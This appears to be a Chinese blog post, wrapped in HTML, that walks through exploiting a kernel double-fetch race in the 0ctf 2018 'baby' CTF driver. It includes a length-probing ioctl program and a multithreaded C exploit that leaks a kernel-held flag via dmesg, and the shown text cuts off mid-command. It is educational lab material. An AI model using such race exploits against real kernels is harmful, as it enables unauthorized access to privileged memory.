@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="内核学习(四) double_fetch。这次主要基于ctf_wiki学习。DoubleFetch相关知识点可在微软安全研究中找到。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel-4-doubleFetch">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/02/11/kernel-4-doubleFetch/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="内核学习(四) double_fetch。这次主要基于ctf_wiki学习。DoubleFetch相关知识点可在微软安全研究中找到。">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220211115806806.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220211115923349.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220211150611494.png">
+<meta property="article:published_time" content="2022-02-11T02:16:38.000Z">
+<meta property="article:modified_time" content="2022-02-11T10:19:10.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220211115806806.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>kernel-4-doubleFetch | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-kernel-4-doubleFetch" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/02/11/kernel-4-doubleFetch/" class="article-date">
+      <time datetime="2022-02-11T02:16:38.000Z" itemprop="datePublished">2022-02-11</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      kernel-4-doubleFetch
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/basic/">basic</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>内核学习(四) double_fetch。这次主要基于<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">ctf_wiki</a>学习。DoubleFetch相关知识点可在<a target="_blank" rel="noopener" href="https://msrc-blog.microsoft.com/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/">微软安全研究</a>中找到。</p>
+<span id="more"></span>
+
+<h1 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double_fetch"></a>double_fetch</h1><p>阅读<a target="_blank" rel="noopener" href="https://msrc-blog.microsoft.com/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/">微软安全研究</a>的文章</p>
+<p><strong>double_fetch是指当内核根据用户输入先判断某个参数的信息，保存在本地之后，如果后面还需要访问这个内容(当内核函数两次从同一用户内存地址读取同一数据时，通常第一次读取用来验证数据或建立联系，第二次则用来使用该数据)，可能会复制进来新的信息(利用多线程，条件竞争)这样可能会导致信息不匹配。严重的话可能导致堆栈溢出等情况</strong>。</p>
+<p>一个很简单的例子是如下代码，也是上述文章中的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Attacker controls lParam</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win32k_entry_point</span><span class="params">(…)</span> &#123;</span><br><span class="line">   […]</span><br><span class="line">      <span class="comment">// lParam has already passed successfully the ProbeForRead</span></span><br><span class="line">      my_struct = (PMY_STRUCT)lParam;</span><br><span class="line">      <span class="keyword">if</span> (my_struct -&gt;lpData) &#123;</span><br><span class="line">           cbCapture = <span class="keyword">sizeof</span>(MY_STRUCT) + my_struct-&gt;cbData;  <span class="comment">// [1] first fetch</span></span><br><span class="line">    […]</span><br><span class="line">                 <span class="comment">// my_struct -&gt;lpData has already passed successfully the ProbeForRead</span></span><br><span class="line">    […]</span><br><span class="line">            <span class="keyword">if</span> ( my_allocation = UserAllocPoolWithQuota(cbCapture, TAG_SMS_CAPTURE)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                 RtlCopyMemory(my_allocation, my_struct-&gt;lpData, my_struct-&gt;cbData);   <span class="comment">// [2] second fetch</span></span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   […]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果第一次通过fetch拿到了一个长度，第二次如果是别的内核线程运行到这里，由于没有加锁，可能从相同的结构体中复制错误的数据长度。简单来说，其实就是多线程下共享变量未保护的问题(个人理解)</p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>这里使用经典的0ctf2018 finals baby。这里的double_fetch的效果是读取内核特定地址信息，没有完成提权等效果。</p>
+<p>首先解压文件系统</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解包文件系统</span></span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio ./core/core.cpio</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br><span class="line">rm -rf core.cpio</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到baby.ko文件，放到IDA中，打包文件系统</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重打包文件系统</span></span><br><span class="line">find . | cpio -o --format=newc &gt; core.cpio</span><br><span class="line">mv ./core.cpio ../</span><br></pre></td></tr></table></figure>
+
+<p>放在IDA里面看一下。驱动主要用两个功能</p>
+<ol>
+<li>当command=0x6666时，输出flag对应的地址</li>
+<li>当command=0x1337时，对我们的输入做如下比较之后，逐字节比较我们输入的flag和正确的flag。如果一样就给出flag（和没有一样）</li>
+</ol>
+<p><img src="/.io//image-20220211115806806.png" alt="image-20220211115806806"></p>
+<p>因此可以看出，比较的内容如下</p>
+<p><img src="/.io//image-20220211115923349.png" alt="image-20220211115923349"></p>
+<p>这里注意到flag是硬编码的。远程的flag是修改过的，所以长度肯定也不同。因此我们还需要知道远程flag的长度。这个可以一个一个尝试来获取。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>之前的double_fetch框架提示我们：需要两次对用户输入判断才能利用这种工具。这里恰好有这种情形。可以看出，<strong>如果第一个线程的输入成功绕过位于用户空间的比对条件之后，在和flag逐字节比较之前，将我们的flag指针改为之前打印出来的内核地址</strong>，就可以在后面比较时泄露内核地址。</p>
+<p>我们exp编写的步骤为</p>
+<blockquote>
+<ol>
+<li>拿到flag内核地址，flag长度。</li>
+<li>通过多线程double_fetch实现buf指针的劫持，绕过检测</li>
+<li>通过dmesg查找到内核打印到内核缓冲区的flag</li>
+</ol>
+</blockquote>
+<p>dmesg命令用于显示开机信息，属于内核信息。用户态需要通过<strong>dmesg命令</strong>来看到。</p>
+<h1 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h1><h2 id="获得flag长度"><a href="#获得flag长度" class="headerlink" title="获得flag长度"></a>获得flag长度</h2><p>从反汇编代码看出，如果检查条件(所属空间、长度)不满足，返回值为0x16。我们只需要在用户态编写循环遍历即可得到。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>        <span class="comment">/* System V */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>    <span class="comment">/* BSD and Linux */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag_str;</span><br><span class="line">    <span class="type">long</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_input</span> *<span class="title">input</span> =</span> (<span class="keyword">struct</span> user_input*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_input));</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(cnt=<span class="number">0</span>;cnt&lt;<span class="number">50</span>;cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;trying %d: &quot;</span>,cnt);</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        input-&gt;flag_str = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">        input-&gt;length = cnt;</span><br><span class="line">        ret = ioctl(fd,<span class="number">0x1337</span>,input);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">0x16</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ok! the length of flag is %d\n&quot;</span>,cnt);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;return %d\n&quot;</span>,ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到远程的flag长度为33。</p>
+<p><img src="/.io//image-20220211150611494.png" alt="image-20220211150611494"></p>
+<h2 id="double-fetch-1"><a href="#double-fetch-1" class="headerlink" title="double_fetch"></a>double_fetch</h2><p>这里需要创建两个线程（一个为原先的主线程）其中主线程不断发起<code>ioctl(fd,0x1337,&amp;input)</code>另一个线程反复修改传递的input结构体中的flag_addr数值。由于每次需要通过dmesg查看输出的flag地址比较麻烦，ctf-wiki上面采用了读取文件，利用字符串匹配寻找到最终目标地址的方法。</p>
+<p>需要注意的是子线程每次修改的，必须是和主线程一样的数据结构中的flag_buf。最好定义成全局的(虽然理论上来说，不同线程的栈也可以共享)，<strong>此外，尽量让线程少输出，因为io会大大增加开销，可能导致竞争失败</strong>，原先这里就卡了好久，结果关掉输出就对了。</p>
+<p>下面的exp主要参考ctf-wiki上面。自己敲了一遍代码，理解了一下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -lpthread -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack, <span class="type">const</span> <span class="type">char</span> *needle)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcasestr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack, <span class="type">const</span> <span class="type">char</span> *needle)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRYTIME 0x1000 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag_str;</span><br><span class="line">    <span class="type">long</span> length;</span><br><span class="line">&#125; input;</span><br><span class="line"><span class="type">int</span> finish = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> flag_place;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trying</span><span class="params">(<span class="type">void</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_input</span> *<span class="title">mal</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span>(finish == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;trying..%u\n&quot;,flag_place); //no io!!!</span></span><br><span class="line">        mal-&gt;flag_str = flag_place; <span class="comment">// maliciously changeing</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> tmp_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">0x1000</span>];</span><br><span class="line">    lseek(tmp_fd,<span class="number">-0x100</span>,SEEK_END);</span><br><span class="line">    read(tmp_fd,temp,<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">char</span> * idx = <span class="built_in">strstr</span>(temp,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	close(tmp_fd);</span><br><span class="line">    idx+=<span class="number">16</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr = strtoull(idx,idx+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;------addr----------&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]flag addr: %p\n&quot;</span>,addr);</span><br><span class="line">    flag_place = addr;</span><br><span class="line">    input.flag_str = buf;</span><br><span class="line">    input.length = <span class="number">33</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> cnt1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> cnt2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//thread</span></span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,trying,&amp;input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// main thread</span></span><br><span class="line">    <span class="keyword">for</span>(cnt1=<span class="number">0</span>;cnt1&lt;<span class="number">1000</span>;cnt1++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;input);</span><br><span class="line">        input.flag_str = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] result is: &quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;dmesg | grep 